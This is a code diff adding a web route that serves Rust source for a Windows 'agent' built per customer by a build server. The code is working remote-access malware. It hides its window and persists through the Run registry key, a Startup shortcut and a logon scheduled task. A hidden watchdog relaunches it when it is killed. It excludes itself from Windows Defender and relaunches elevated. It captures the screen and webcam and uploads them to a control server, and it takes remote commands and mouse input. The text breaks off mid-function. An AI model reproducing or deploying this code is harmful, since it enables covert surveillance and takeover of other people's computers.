@@ -1,0 +1,3555 @@
+import { createFileRoute } from '@tanstack/react-router'
+
+// ─────────────────────────────────────────────────────────────────────────────
+// Rust agent stub served to the build server.
+//
+// The build server fetches this, writes each file into a temp directory,
+// substitutes {{PLACEHOLDERS}} in binding.rs, then runs:
+//   cargo build --release --target x86_64-pc-windows-gnu
+//
+// Features implemented in the agent:
+//   • Auto-register + heartbeat + command poll (HTTP)
+//   • Screen capture + JPEG streaming
+//   • Camera capture (ffmpeg on Windows)
+//   • Remote shell (cmd /C)
+//   • Filesystem list/read/delete
+//   • Process list/kill
+//   • System actions (shutdown, restart, lock, notify, volume, sound)
+//   • WebRTC live-stream (H.264 via openh264 + Supabase Realtime signaling)
+//   • HidenHost relay (WSS) for real-time frame streaming + command reception
+//   • Clipboard get/set
+//   • Input mouse/keyboard forwarding placeholders
+//   • Scheduled-task startup (Windows schtasks)
+// ─────────────────────────────────────────────────────────────────────────────
+
+const bindingRs = `// Per-build constants — overwritten by the build server before \`cargo build\`.
+pub const OWNER_USER_ID: &str = "{{USER_ID}}";
+pub const SENTINEL_SERVER: &str = "{{API_BASE}}";
+pub const BUILD_NAME: &str = "{{BUILD_NAME}}";
+pub const STARTUP_TASK: bool = {{FEATURE_STARTUP}};
+pub const STARTUP_NAME: &str = "{{STARTUP_NAME}}";
+pub const DEBUG_CONSOLE: bool = {{DEBUG}};
+pub const ANTIKILL: bool = {{FEATURE_ANTIKILL}};
+pub const WD_EXCLUSION: bool = {{FEATURE_WD_EXCLUSION}};
+pub const REQUIRE_ADMIN: bool = {{FEATURE_REQUIRE_ADMIN}};
+pub const FUN_FEATURES: bool = {{FEATURE_FUN}};
+pub const BUILD_TAG: &str = "{{BUILD_TAG}}";
+
+pub const SUPABASE_URL: &str = "{{SUPABASE_URL}}";
+pub const SUPABASE_ANON_KEY: &str = "{{SUPABASE_ANON_KEY}}";
+
+pub const HIDEN_WS_URL: &str = "{{RELAY_URL}}";
+pub const HIDEN_HTTP_URL: &str = "{{RELAY_HTTP_URL}}";
+pub const HIDEN_AUTH_KEY: &str = "{{HIDEN_AUTH_KEY}}";
+
+// Pre-registered identity baked at build time. When non-empty the agent uses
+// these directly and never reads or writes a config file on disk.
+pub const BIND_DEVICE_ID: &str = "{{BIND_DEVICE_ID}}";
+pub const BIND_DEVICE_TOKEN: &str = "{{BIND_DEVICE_TOKEN}}";
+`
+
+const mainRs = `// Sentinel Agent — Rust edition.
+// Two build targets share this source:
+//   agent.exe  → built with --subsystem windows (no console)
+//   debug.exe  → normal console build (prints logs)
+// First run: auto-registers with the server, persists token next to the exe.
+// Then: heartbeats every 5s, polls commands every 1s, streams screen on demand.
+// HidenHost relay: connects via WSS for real-time frame push + command reception.
+
+#![cfg_attr(all(windows, not(debug_assertions), feature = "windowed"), windows_subsystem = "windows")]
+
+use base64::Engine;
+use serde::{Deserialize, Serialize};
+use serde_json::{json, Value};
+use std::{
+    fs,
+    path::PathBuf,
+    process::Command,
+    sync::{
+        atomic::{AtomicBool, Ordering},
+        Arc, Mutex,
+    },
+    thread,
+    time::{Duration, Instant},
+};
+
+mod binding;
+mod hiden;
+mod signaling;
+mod webrtc;
+
+const DEFAULT_SERVER: &str = binding::SENTINEL_SERVER;
+const BIND_USER_ID: Option<&str> = if binding::OWNER_USER_ID.is_empty() {
+    None
+} else {
+    Some(binding::OWNER_USER_ID)
+};
+const STARTUP_FLAG: bool = binding::STARTUP_TASK;
+const STARTUP_NAME_STR: &str = binding::STARTUP_NAME;
+
+#[derive(Serialize, Deserialize, Clone)]
+struct Config {
+    server: String,
+    device_id: String,
+    device_token: String,
+}
+
+/// Dynamic stream settings shared between command handlers and the stream thread.
+#[derive(Clone)]
+struct StreamConfig {
+    quality: u8,
+    fps_cap: u32,
+}
+
+impl Default for StreamConfig {
+    fn default() -> Self {
+        Self { quality: 60, fps_cap: 30 }
+    }
+}
+
+fn config_path() -> PathBuf {
+    std::env::current_exe()
+        .ok()
+        .and_then(|p| p.parent().map(|d| d.join("sentinel-agent.json")))
+        .unwrap_or_else(|| PathBuf::from("sentinel-agent.json"))
+}
+
+fn load_config() -> Option<Config> {
+    let s = fs::read_to_string(config_path()).ok()?;
+    serde_json::from_str(&s).ok()
+}
+
+fn save_config(_c: &Config) {
+    // Intentionally a no-op: identity is baked into the EXE at build time, so
+    // we never persist anything on the user's disk.
+}
+
+fn is_stale_server_url(server: &str) -> bool {
+    let current = DEFAULT_SERVER.trim_end_matches('/');
+    let saved = server.trim_end_matches('/');
+    saved != current || saved.contains("lovableproject.com") || saved.contains("id-preview--")
+}
+
+macro_rules! log {
+    ($($arg:tt)*) => {{
+        eprintln!("[{}] {}", chrono_like_ts(), format!($($arg)*));
+    }}
+}
+
+fn chrono_like_ts() -> String {
+    use std::time::{SystemTime, UNIX_EPOCH};
+    let secs = SystemTime::now().duration_since(UNIX_EPOCH).map(|d| d.as_secs()).unwrap_or(0);
+    let h = (secs / 3600) % 24;
+    let m = (secs / 60) % 60;
+    let s = secs % 60;
+    format!("{:02}:{:02}:{:02}", h, m, s)
+}
+
+fn http() -> ureq::Agent {
+    ureq::AgentBuilder::new()
+        .timeout_connect(Duration::from_secs(10))
+        .timeout(Duration::from_secs(60))
+        .user_agent("SentinelAgent-Rust/0.3")
+        .build()
+}
+
+fn post(server: &str, path: &str, body: &Value) -> Result<Value, String> {
+    let url = format!("{}{}", server.trim_end_matches('/'), path);
+    match http().post(&url).send_json(body.clone()) {
+        Ok(resp) => resp.into_json::<Value>().map_err(|e| e.to_string()),
+        Err(ureq::Error::Status(code, resp)) => {
+            let body = resp.into_string().unwrap_or_default();
+            Err(format!("server {}: {}", code, body))
+        }
+        Err(e) => Err(e.to_string()),
+    }
+}
+
+fn pc_name() -> String {
+    gethostname::gethostname().to_string_lossy().to_string()
+}
+fn username() -> String {
+    whoami::username()
+}
+fn os_name() -> String {
+    if cfg!(windows) { "Windows".into() }
+    else if cfg!(target_os = "macos") { "macOS".into() }
+    else { "Linux".into() }
+}
+
+fn auto_register(server: &str) -> Result<Config, String> {
+    let mut body = json!({
+        "pc_name": pc_name(),
+        "device_name": pc_name(),
+        "os": os_name(),
+        "username": username(),
+    });
+    if let Some(uid) = BIND_USER_ID {
+        body["bind_user_id"] = json!(uid);
+    }
+    if !binding::BUILD_TAG.is_empty() {
+        body["tag"] = json!(binding::BUILD_TAG);
+    }
+    let resp = post(server, "/api/public/agent/auto-register", &body)?;
+    let device_id = resp.get("device_id").and_then(|v| v.as_str())
+        .ok_or("missing device_id")?.to_string();
+    let device_token = resp.get("device_token").and_then(|v| v.as_str())
+        .ok_or("missing device_token")?.to_string();
+    let cfg = Config { server: server.to_string(), device_id, device_token };
+    save_config(&cfg);
+    if STARTUP_FLAG { let _ = install_startup(); }
+    if binding::ANTIKILL { let _ = install_antikill(); }
+    Ok(cfg)
+}
+
+#[cfg(windows)]
+fn persistence_record_path() -> PathBuf {
+    std::env::current_exe()
+        .ok()
+        .and_then(|p| p.parent().map(|d| d.join("sentinel-persistence.json")))
+        .unwrap_or_else(|| PathBuf::from("sentinel-persistence.json"))
+}
+
+#[cfg(windows)]
+fn save_persistence_paths(paths: &serde_json::Value) {
+    if let Ok(s) = serde_json::to_string_pretty(paths) {
+        let _ = fs::write(persistence_record_path(), s);
+    }
+}
+
+#[cfg(windows)]
+fn load_persistence_paths() -> serde_json::Value {
+    fs::read_to_string(persistence_record_path())
+        .ok()
+        .and_then(|s| serde_json::from_str::<Value>(&s).ok())
+        .unwrap_or_else(|| json!({"entries": []}))
+}
+
+#[cfg(windows)]
+fn install_startup() -> serde_json::Value {
+    let name = STARTUP_NAME_STR;
+    let exe = match std::env::current_exe() {
+        Ok(p) => p.to_string_lossy().to_string(),
+        Err(_) => return json!({"entries": [], "error": "no exe path"}),
+    };
+    let mut entries: Vec<Value> = vec![];
+
+    // 1. HKCU Run registry key
+    let reg_script = format!(
+        "New-ItemProperty -Path 'HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' -Name '{}' -Value '\\\"{}\\\"' -PropertyType String -Force | Out-Null",
+        name.replace('\\'', ""), exe.replace('\\'', "")
+    );
+    let reg_ok = powershell(&reg_script).is_ok();
+    entries.push(json!({
+        "kind": "registry",
+        "path": format!("HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\{}", name),
+        "ok": reg_ok,
+    }));
+
+    // 2. Startup folder shortcut (.lnk)
+    let appdata = std::env::var("APPDATA").unwrap_or_default();
+    let lnk_path = format!("{}\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\{}.lnk", appdata, name);
+    let lnk_script = format!(
+        "$ws = New-Object -ComObject WScript.Shell; \
+         $s = $ws.CreateShortcut('{}'); \
+         $s.TargetPath = '{}'; \
+         $s.WorkingDirectory = '{}'; \
+         $s.WindowStyle = 7; \
+         $s.Save()",
+        ps_escape(&lnk_path),
+        ps_escape(&exe),
+        ps_escape(&std::path::Path::new(&exe).parent().map(|p| p.to_string_lossy().to_string()).unwrap_or_default())
+    );
+    let lnk_ok = powershell(&lnk_script).is_ok();
+    entries.push(json!({
+        "kind": "startup_folder",
+        "path": lnk_path,
+        "ok": lnk_ok,
+    }));
+
+    // 3. Scheduled task (ONLOGON, highest priv)
+    let task_script = format!(
+        "schtasks /Create /F /SC ONLOGON /RL HIGHEST /TN \\\"{}\\\" /TR \\\"\\\\\\\"{}\\\\\\\"\\\" | Out-Null",
+        name.replace('\\'', ""), exe.replace('\\'', "")
+    );
+    let task_ok = powershell(&task_script).is_ok();
+    entries.push(json!({
+        "kind": "scheduled_task",
+        "path": format!("Task Scheduler\\\\{}", name),
+        "ok": task_ok,
+    }));
+
+    let result = json!({"entries": entries, "exe": exe});
+    save_persistence_paths(&result);
+    result
+}
+
+#[cfg(windows)]
+fn uninstall_startup() -> serde_json::Value {
+    let name = STARTUP_NAME_STR;
+    let mut entries: Vec<Value> = vec![];
+
+    let reg_script = format!(
+        "Remove-ItemProperty -Path 'HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' -Name '{}' -ErrorAction SilentlyContinue",
+        name.replace('\\'', "")
+    );
+    entries.push(json!({"kind": "registry", "removed": powershell(&reg_script).is_ok()}));
+
+    let appdata = std::env::var("APPDATA").unwrap_or_default();
+    let lnk_path = format!("{}\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\{}.lnk", appdata, name);
+    let _ = fs::remove_file(&lnk_path);
+    entries.push(json!({"kind": "startup_folder", "path": lnk_path, "removed": true}));
+
+    let task_script = format!("schtasks /Delete /F /TN \\\"{}\\\" | Out-Null", name.replace('\\'', ""));
+    entries.push(json!({"kind": "scheduled_task", "removed": powershell(&task_script).is_ok()}));
+
+    let _ = fs::remove_file(persistence_record_path());
+    json!({"entries": entries})
+}
+
+#[cfg(not(windows))]
+fn install_startup() -> serde_json::Value { json!({"entries": [], "note": "non-windows"}) }
+#[cfg(not(windows))]
+fn uninstall_startup() -> serde_json::Value { json!({"entries": [], "note": "non-windows"}) }
+
+// ---------- anti-kill watchdog ----------
+//
+// Spawns a hidden PowerShell loop that polls every 5s; if our PID is gone
+// it relaunches the exe. The watchdog itself is registered to startup too
+// so killing the agent + the watchdog still resurrects on next logon.
+
+#[cfg(windows)]
+fn install_antikill() -> serde_json::Value {
+    use std::os::windows::process::CommandExt;
+    const DETACHED_PROCESS: u32 = 0x0000_0008;
+    const CREATE_NO_WINDOW: u32 = 0x0800_0000;
+
+    let exe = match std::env::current_exe() {
+        Ok(p) => p.to_string_lossy().to_string(),
+        Err(_) => return json!({"ok": false, "error": "no exe path"}),
+    };
+    let pid = std::process::id();
+    let watchdog_name = format!("{}-watchdog", STARTUP_NAME_STR);
+    let watchdog_ps = std::env::temp_dir().join(format!("{}.ps1", watchdog_name.replace(' ', "_")));
+
+    let script = format!(
+        "$exe = '{}'; $pid0 = {}; \
+         while ($true) {{ \
+           try {{ Get-Process -Id $pid0 -ErrorAction Stop | Out-Null }} \
+           catch {{ \
+             try {{ Start-Process -FilePath $exe -WindowStyle Hidden }} catch {{}}; \
+             Start-Sleep -Seconds 3; \
+             $p = Get-Process | Where-Object {{ $_.Path -eq $exe }} | Select-Object -First 1; \
+             if ($p) {{ $pid0 = $p.Id }} \
+           }}; \
+           Start-Sleep -Seconds 5 \
+         }}",
+        ps_escape(&exe), pid
+    );
+    if fs::write(&watchdog_ps, script).is_err() {
+        return json!({"ok": false, "error": "write watchdog failed"});
+    }
+
+    // Launch watchdog detached
+    let spawn_ok = Command::new("powershell")
+        .args(["-NoProfile", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File",
+               watchdog_ps.to_str().unwrap_or("")])
+        .creation_flags(DETACHED_PROCESS | CREATE_NO_WINDOW)
+        .spawn().is_ok();
+
+    // Also register watchdog itself as a scheduled task so killing both still recovers on next logon
+    let task_script = format!(
+        "schtasks /Create /F /SC ONLOGON /RL HIGHEST /TN \\\"{}\\\" /TR \\\"powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File \\\\\\\"{}\\\\\\\"\\\" | Out-Null",
+        watchdog_name.replace('\\'', ""),
+        watchdog_ps.to_string_lossy().replace('\\'', "")
+    );
+    let task_ok = powershell(&task_script).is_ok();
+
+    json!({
+        "ok": spawn_ok,
+        "watchdog_script": watchdog_ps.to_string_lossy(),
+        "scheduled_task": task_ok,
+    })
+}
+
+#[cfg(windows)]
+fn uninstall_antikill() -> serde_json::Value {
+    let watchdog_name = format!("{}-watchdog", STARTUP_NAME_STR);
+    let task_script = format!("schtasks /Delete /F /TN \\\"{}\\\" | Out-Null", watchdog_name.replace('\\'', ""));
+    let _ = powershell(&task_script);
+    // Best-effort kill of watchdog process
+    let kill_script = "Get-WmiObject Win32_Process -Filter \\\"Name = 'powershell.exe'\\\" | Where-Object { $_.CommandLine -like '*-watchdog*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }";
+    let _ = powershell(kill_script);
+    json!({"ok": true})
+}
+
+#[cfg(not(windows))]
+fn install_antikill() -> serde_json::Value { json!({"ok": false, "note": "non-windows"}) }
+#[cfg(not(windows))]
+fn uninstall_antikill() -> serde_json::Value { json!({"ok": true, "note": "non-windows"}) }
+
+// ---------- privilege elevation + Defender exclusion ----------
+
+#[cfg(windows)]
+fn is_elevated() -> bool {
+    // Heuristic: try to open the local admin-only registry key for write.
+    // Avoids pulling in extra winapi crates.
+    let out = std::process::Command::new("net")
+        .args(["session"])
+        .output();
+    match out {
+        Ok(o) => o.status.success(),
+        Err(_) => false,
+    }
+}
+
+#[cfg(windows)]
+fn relaunch_elevated() -> bool {
+    let exe = match std::env::current_exe() {
+        Ok(p) => p.to_string_lossy().to_string(),
+        Err(_) => return false,
+    };
+    // Use PowerShell Start-Process -Verb RunAs to trigger UAC.
+    let script = format!(
+        "Start-Process -FilePath \\\"{}\\\" -Verb RunAs",
+        exe.replace('\\'', \"\")
+    );
+    let r = std::process::Command::new("powershell")
+        .args(["-NoProfile", "-WindowStyle", "Hidden", "-Command", &script])
+        .status();
+    matches!(r, Ok(s) if s.success())
+}
+
+#[cfg(windows)]
+fn add_defender_exclusion() -> serde_json::Value {
+    let exe = std::env::current_exe().ok();
+    let dir = exe.as_ref().and_then(|p| p.parent()).map(|p| p.to_string_lossy().to_string()).unwrap_or_default();
+    let exe_path = exe.map(|p| p.to_string_lossy().to_string()).unwrap_or_default();
+    let safe_dir = dir.replace('\\'', "");
+    let safe_exe = exe_path.replace('\\'', "");
+    let script = format!(
+        "try {{ Add-MpPreference -ExclusionPath \\\"{}\\\" -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess \\\"{}\\\" -ErrorAction SilentlyContinue }} catch {{}}",
+        safe_dir, safe_exe
+    );
+    let _ = powershell(&script);
+    json!({"ok": true, "path": safe_dir})
+}
+
+#[cfg(not(windows))]
+fn is_elevated() -> bool { true }
+#[cfg(not(windows))]
+fn relaunch_elevated() -> bool { false }
+#[cfg(not(windows))]
+fn add_defender_exclusion() -> serde_json::Value { json!({"ok": false, "note": "non-windows"}) }
+
+static STARTED: once_cell_mini::Lazy<Instant> = once_cell_mini::Lazy::new(Instant::now);
+
+mod once_cell_mini {
+    use std::sync::OnceLock;
+    pub struct Lazy<T, F = fn() -> T> { cell: OnceLock<T>, init: F }
+    impl<T, F: Fn() -> T> Lazy<T, F> {
+        pub const fn new(init: F) -> Self { Self { cell: OnceLock::new(), init } }
+    }
+    impl<T> std::ops::Deref for Lazy<T> {
+        type Target = T;
+        fn deref(&self) -> &T { self.cell.get_or_init(|| (self.init)()) }
+    }
+}
+
+fn heartbeat(cfg: &Config) {
+    let uptime = STARTED.elapsed().as_secs();
+    let mut metrics = json!({ "uptime_seconds": uptime });
+    #[cfg(windows)]
+    {
+        if let Ok(cpu) = powershell(r#"(Get-Counter '\\Processor(_Total)\\% Processor Time').CounterSamples[0].CookedValue"#) {
+            if let Ok(v) = cpu.trim().parse::<f64>() { metrics["cpu_percent"] = json!(v.round()); }
+        }
+        if let Ok(ram) = powershell("$os=Get-CimInstance Win32_OperatingSystem; [math]::Round(($os.TotalVisibleMemorySize - $os.FreePhysicalMemory) / $os.TotalVisibleMemorySize * 100, 1)") {
+            if let Ok(v) = ram.trim().parse::<f64>() { metrics["ram_percent"] = json!(v); }
+        }
+        if let Ok(ram_info) = powershell(r#"$os=Get-CimInstance Win32_OperatingSystem; "$([math]::Round(($os.TotalVisibleMemorySize - $os.FreePhysicalMemory)/1024)),$([math]::Round($os.TotalVisibleMemorySize/1024))""#) {
+            let parts: Vec<&str> = ram_info.trim().split(',').collect();
+            if parts.len() == 2 {
+                if let Ok(used) = parts[0].parse::<i64>() { metrics["ram_used_mb"] = json!(used); }
+                if let Ok(total) = parts[1].parse::<i64>() { metrics["ram_total_mb"] = json!(total); }
+            }
+        }
+        if let Ok(gpu) = powershell("try { $g = (& 'nvidia-smi' '--query-gpu=utilization.gpu' '--format=csv,noheader,nounits' 2>$null); if ($g) { $g.Trim() } else { '' } } catch { '' }") {
+            let trimmed = gpu.trim();
+            if let Ok(v) = trimmed.parse::<f64>() { metrics["gpu_percent"] = json!(v); }
+        }
+    }
+    let body = json!({
+        "device_id": cfg.device_id,
+        "device_token": cfg.device_token,
+        "username": username(),
+        "metrics": metrics,
+    });
+    if let Err(e) = post(&cfg.server, "/api/public/agent/heartbeat", &body) {
+        log!("heartbeat err: {}", e);
+    }
+}
+
+fn poll(cfg: &Config) -> Vec<Value> {
+    let body = json!({ "device_id": cfg.device_id, "device_token": cfg.device_token });
+    match post(&cfg.server, "/api/public/agent/poll", &body) {
+        Ok(v) => v.get("commands").and_then(|c| c.as_array()).cloned().unwrap_or_default(),
+        Err(e) => { log!("poll err: {}", e); vec![] }
+    }
+}
+
+fn send_result(cfg: &Config, command_id: &str, ok: bool, result: Value, err: Option<String>) {
+    // Relay-originated commands have no DB command row (empty id). Skip the HTTP
+    // round-trip entirely — the UI already receives the response over the socket.
+    if command_id.is_empty() { return; }
+    let body = json!({
+        "device_id": cfg.device_id,
+        "device_token": cfg.device_token,
+        "command_id": command_id,
+        "ok": ok,
+        "result": result,
+        "error": err.unwrap_or_default(),
+    });
+    if let Err(e) = post(&cfg.server, "/api/public/agent/result", &body) {
+        log!("result err: {}", e);
+    }
+}
+
+fn push_screen(cfg: &Config, jpeg_b64: &str) -> Result<(), String> {
+    let body = json!({
+        "device_id": cfg.device_id,
+        "device_token": cfg.device_token,
+        "jpeg_b64": jpeg_b64,
+    });
+    post(&cfg.server, "/api/public/agent/screen", &body).map(|_| ())
+}
+
+fn push_camera(cfg: &Config, jpeg_b64: &str) -> Result<(), String> {
+    let body = json!({
+        "device_id": cfg.device_id,
+        "device_token": cfg.device_token,
+        "jpeg_b64": jpeg_b64,
+    });
+    post(&cfg.server, "/api/public/agent/camera", &body).map(|_| ())
+}
+
+// ---------- camera capture (Windows, via ffmpeg dshow if present) ----------
+
+#[cfg(windows)]
+static CAM_DEVICE: std::sync::OnceLock<Mutex<Option<String>>> = std::sync::OnceLock::new();
+#[cfg(windows)]
+static FFMPEG_PATH: std::sync::OnceLock<Mutex<Option<String>>> = std::sync::OnceLock::new();
+
+// Resolve ffmpeg.exe: PATH first, then %LOCALAPPDATA%\hidenhost\ffmpeg.exe;
+// if neither exists, download the Gyan.dev essentials build (first run only,
+// cached forever). Returns absolute path to ffmpeg.exe.
+#[cfg(windows)]
+fn ensure_ffmpeg() -> Result<String, String> {
+    use std::os::windows::process::CommandExt;
+    const CREATE_NO_WINDOW: u32 = 0x0800_0000;
+    let cache = FFMPEG_PATH.get_or_init(|| Mutex::new(None));
+    if let Ok(g) = cache.lock() { if let Some(p) = g.as_ref() { return Ok(p.clone()); } }
+
+    // 1. PATH
+    if Command::new("ffmpeg").arg("-version").creation_flags(CREATE_NO_WINDOW).output().map(|o| o.status.success()).unwrap_or(false) {
+        if let Ok(mut g) = cache.lock() { *g = Some("ffmpeg".to_string()); }
+        return Ok("ffmpeg".to_string());
+    }
+    // 2. local cache
+    let base = std::env::var("LOCALAPPDATA").map_err(|_| "no LOCALAPPDATA".to_string())?;
+    let dir = std::path::PathBuf::from(&base).join("hidenhost");
+    let exe = dir.join("ffmpeg.exe");
+    if exe.exists() {
+        let p = exe.to_string_lossy().to_string();
+        if let Ok(mut g) = cache.lock() { *g = Some(p.clone()); }
+        return Ok(p);
+    }
+    // 3. download. Use PowerShell: Invoke-WebRequest + Expand-Archive.
+    let _ = fs::create_dir_all(&dir);
+    let zip = dir.join("ffmpeg.zip");
+    let url = "https://www.gyan.dev/ffmpeg/builds/ffmpeg-release-essentials.zip";
+    let ps = format!(
+        "$ErrorActionPreference='Stop'; [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -UseBasicParsing -Uri '{}' -OutFile '{}'; Expand-Archive -Force -Path '{}' -DestinationPath '{}'; $f = Get-ChildItem -Recurse -Path '{}' -Filter 'ffmpeg.exe' | Select-Object -First 1; Copy-Item -Force $f.FullName '{}'; Remove-Item -Recurse -Force (Join-Path '{}' 'ffmpeg-*'); Remove-Item -Force '{}'",
+        url, zip.display(), zip.display(), dir.display(), dir.display(), exe.display(), dir.display(), zip.display()
+    );
+    log!("downloading ffmpeg (first-run, ~80MB)…");
+    let out = Command::new("powershell")
+        .args(["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", &ps])
+        .creation_flags(CREATE_NO_WINDOW)
+        .output()
+        .map_err(|e| format!("ffmpeg download failed: {}", e))?;
+    if !exe.exists() {
+        return Err(format!("ffmpeg install failed: {}", String::from_utf8_lossy(&out.stderr)));
+    }
+    let p = exe.to_string_lossy().to_string();
+    if let Ok(mut g) = cache.lock() { *g = Some(p.clone()); }
+    log!("ffmpeg ready at {}", p);
+    Ok(p)
+}
+
+#[cfg(windows)]
+fn find_camera_device() -> Result<String, String> {
+    use std::os::windows::process::CommandExt;
+    const CREATE_NO_WINDOW: u32 = 0x0800_0000;
+    let cache = CAM_DEVICE.get_or_init(|| Mutex::new(None));
+    if let Ok(guard) = cache.lock() {
+        if let Some(d) = guard.as_ref() { return Ok(d.clone()); }
+    }
+    let ffmpeg = ensure_ffmpeg()?;
+    let list = Command::new(&ffmpeg)
+        .args(["-hide_banner", "-list_devices", "true", "-f", "dshow", "-i", "dummy"])
+        .creation_flags(CREATE_NO_WINDOW)
+        .output()
+        .map_err(|e| format!("ffmpeg exec failed: {}", e))?;
+    let text = String::from_utf8_lossy(&list.stderr).to_string();
+    let mut device: Option<String> = None;
+    let mut in_video = false;
+    for line in text.lines() {
+        if line.contains("DirectShow video devices") { in_video = true; continue; }
+        if line.contains("DirectShow audio devices") { in_video = false; }
+        if in_video {
+            if let (Some(a), Some(b)) = (line.find('"'), line.rfind('"')) {
+                if b > a {
+                    device = Some(line[a + 1..b].to_string());
+                    break;
+                }
+            }
+        }
+    }
+    let device = device.ok_or("no DirectShow video device found")?;
+    if let Ok(mut g) = cache.lock() { *g = Some(device.clone()); }
+    Ok(device)
+}
+
+#[cfg(windows)]
+fn capture_camera_jpeg(_quality: u8) -> Result<Vec<u8>, String> {
+    use std::os::windows::process::CommandExt;
+    const CREATE_NO_WINDOW: u32 = 0x0800_0000;
+    let device = find_camera_device()?;
+    let ffmpeg = ensure_ffmpeg()?;
+    let tmp = std::env::temp_dir().join("sentinel-cam.jpg");
+    let _ = fs::remove_file(&tmp);
+    let arg = format!("video={}", device);
+    let q = _quality.clamp(2, 31) as i32; // ffmpeg q:v scale (lower = better)
+    let qarg = (32 - (_quality as i32 / 4)).clamp(2, 31).to_string();
+    let _ = q;
+    let out = Command::new(&ffmpeg)
+        .args(["-hide_banner", "-loglevel", "error", "-y", "-f", "dshow", "-i", &arg,
+               "-frames:v", "1", "-q:v", &qarg, tmp.to_str().unwrap_or("cam.jpg")])
+        .creation_flags(CREATE_NO_WINDOW)
+        .output()
+        .map_err(|e| e.to_string())?;
+    if !out.status.success() {
+        // device may have changed — invalidate cache
+        if let Some(c) = CAM_DEVICE.get() { if let Ok(mut g) = c.lock() { *g = None; } }
+        return Err(String::from_utf8_lossy(&out.stderr).to_string());
+    }
+    fs::read(&tmp).map_err(|e| e.to_string())
+}
+
+#[cfg(not(windows))]
+fn capture_camera_jpeg(_q: u8) -> Result<Vec<u8>, String> {
+    Err("camera capture only supported on Windows".into())
+}
+
+fn capture_jpeg(quality: u8) -> Result<(Vec<u8>, u32, u32), String> {
+    #[cfg(windows)]
+    {
+        use std::os::windows::process::CommandExt;
+        const CREATE_NO_WINDOW: u32 = 0x0800_0000;
+        let tmp = std::env::temp_dir().join("sentinel-screen.jpg");
+        let _ = fs::remove_file(&tmp);
+        let q = quality.clamp(20, 90);
+        let tmp_s = tmp.to_string_lossy().to_string();
+        let script = format!(
+            "Add-Type -AssemblyName System.Windows.Forms; \
+             Add-Type -AssemblyName System.Drawing; \
+             $b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; \
+             $bmp = New-Object System.Drawing.Bitmap($b.Width, $b.Height); \
+             $g = [System.Drawing.Graphics]::FromImage($bmp); \
+             $g.CopyFromScreen($b.Location, [System.Drawing.Point]::Empty, $b.Size); \
+             $g.Dispose(); \
+             $codec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object {{ $_.MimeType -eq 'image/jpeg' }}; \
+             $ep = New-Object System.Drawing.Imaging.EncoderParameters(1); \
+             $ep.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality, [long]{}); \
+             $bmp.Save('{}', $codec, $ep); \
+             $bmp.Dispose(); \
+             Write-Output (\\\"$($b.Width)x$($b.Height)\\\")",
+            q, tmp_s.replace("'", "''")
+        );
+        let out = Command::new("powershell")
+            .args(["-NoProfile", "-NonInteractive", "-Command", &script])
+            .creation_flags(CREATE_NO_WINDOW)
+            .output()
+            .map_err(|e| e.to_string())?;
+        if !out.status.success() {
+            return Err(String::from_utf8_lossy(&out.stderr).to_string());
+        }
+        let dims = String::from_utf8_lossy(&out.stdout).trim().to_string();
+        let parts: Vec<&str> = dims.split('x').collect();
+        let w: u32 = parts.first().and_then(|s| s.parse().ok()).unwrap_or(1920);
+        let h: u32 = parts.get(1).and_then(|s| s.parse().ok()).unwrap_or(1080);
+        let data = fs::read(&tmp).map_err(|e| e.to_string())?;
+        Ok((data, w, h))
+    }
+    #[cfg(not(windows))]
+    {
+        let _ = quality;
+        Err("screen capture only supported on Windows".into())
+    }
+}
+
+// ---------- mouse / keyboard / input control (Windows) ----------
+
+#[cfg(windows)]
+fn mouse_action(event: &str, payload: &Value) -> Result<Value, String> {
+    use std::os::windows::process::CommandExt;
+    const CREATE_NO_WINDOW: u32 = 0x0800_0000;
+
+    let x_rel = payload.get("xRel").and_then(|v| v.as_f64()).unwrap_or(-1.0);
+    let y_rel = payload.get("yRel").and_then(|v| v.as_f64()).unwrap_or(-1.0);
+
+    match event {
+        "move" => {
+            if x_rel < 0.0 || y_rel < 0.0 { return Ok(json!({"ok": true})); }
+            let script = format!(
+                "Add-Type -AssemblyName System.Windows.Forms; \
+                 $b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; \
+                 [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point([int]($b.Width*{}), [int]($b.Height*{}))",
+                x_rel, y_rel
+            );
+            let _ = Command::new("powershell")
+                .args(["-NoProfile", "-NonInteractive", "-Command", &script])
+                .creation_flags(CREATE_NO_WINDOW)
+                .output();
+        }
+        "down" | "up" => {
+            let button = payload.get("button").and_then(|v| v.as_str()).unwrap_or("left");
+            // Move to position first, then fire mouse event
+            let (down_flag, up_flag) = match button {
+                "right" => ("0x0008", "0x0010"),
+                "middle" => ("0x0020", "0x0040"),
+                _ => ("0x0002", "0x0004"),
+            };
+            let flag = if event == "down" { down_flag } else { up_flag };
+            let mut script = String::new();
+            script.push_str("Add-Type -AssemblyName System.Windows.Forms; ");
+            script.push_str("Add-Type -Name M -Namespace W -MemberDefinition '[DllImport(\\\"user32.dll\\\")] public static extern void mouse_event(uint f, uint x, uint y, uint d, int e);'; ");
+            if x_rel >= 0.0 && y_rel >= 0.0 {
+                script.push_str(&format!(
+                    "$b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; \
+                     [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point([int]($b.Width*{}), [int]($b.Height*{})); ",
+                    x_rel, y_rel
+                ));
+            }
+            script.push_str(&format!("[W.M]::mouse_event({}, 0, 0, 0, 0)", flag));
+            let _ = Command::new("powershell")
